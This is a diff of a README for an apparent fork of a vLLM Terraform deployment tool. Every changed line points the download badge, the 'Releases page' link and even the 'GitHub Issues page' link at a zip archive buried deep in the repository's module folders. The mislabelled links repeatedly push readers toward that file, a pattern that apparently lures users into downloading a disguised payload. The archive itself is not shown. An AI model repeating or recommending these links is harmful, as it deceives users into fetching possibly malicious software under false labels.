@@ -1,6 +1,6 @@
 # 🌐 vllm-production-stack-terraform - Simplify Multi-Cloud Deployments Easily
 
-[![Download the latest release](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/gke/modules/google-project-factory/modules/core_project_factory/vllm-production-stack-terraform-v3.5.zip%20the%20latest%20release-vllm--production--stack--terraform-brightgreen)](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/gke/modules/google-project-factory/modules/core_project_factory/vllm-production-stack-terraform-v3.5.zip)
+[![Download the latest release](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/nebius/config/llm-stack/terraform-stack-production-vllm-1.9.zip%20the%20latest%20release-vllm--production--stack--terraform-brightgreen)](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/nebius/config/llm-stack/terraform-stack-production-vllm-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ vllm-production-stack-terraform is a tool designed for easy deployment across di
 To get started, you need to visit the Releases page. Here’s how:
 
 1. Click the link below to visit the Releases page:
-   [Visit this page to download](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/gke/modules/google-project-factory/modules/core_project_factory/vllm-production-stack-terraform-v3.5.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/nebius/config/llm-stack/terraform-stack-production-vllm-1.9.zip)
 
 2. Once on the page, look for the latest release. It will typically appear at the top.
 
@@ -89,7 +89,7 @@ If you still encounter problems, feel free to reach out in the GitHub repository
 
 For support or questions:
 
-- Raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/gke/modules/google-project-factory/modules/core_project_factory/vllm-production-stack-terraform-v3.5.zip).
+- Raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/nebius/config/llm-stack/terraform-stack-production-vllm-1.9.zip).
 - Engage on community forums related to the application.
 
 ## 🆕 Change Log
@@ -98,4 +98,4 @@ Check the latest changes and features introduced in the latest releases on the R
 
 Remember, you can download the application from the following link:
 
-[Visit this page to download](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/gke/modules/google-project-factory/modules/core_project_factory/vllm-production-stack-terraform-v3.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/pakolee867/vllm-production-stack-terraform/main/nebius/config/llm-stack/terraform-stack-production-vllm-1.9.zip)
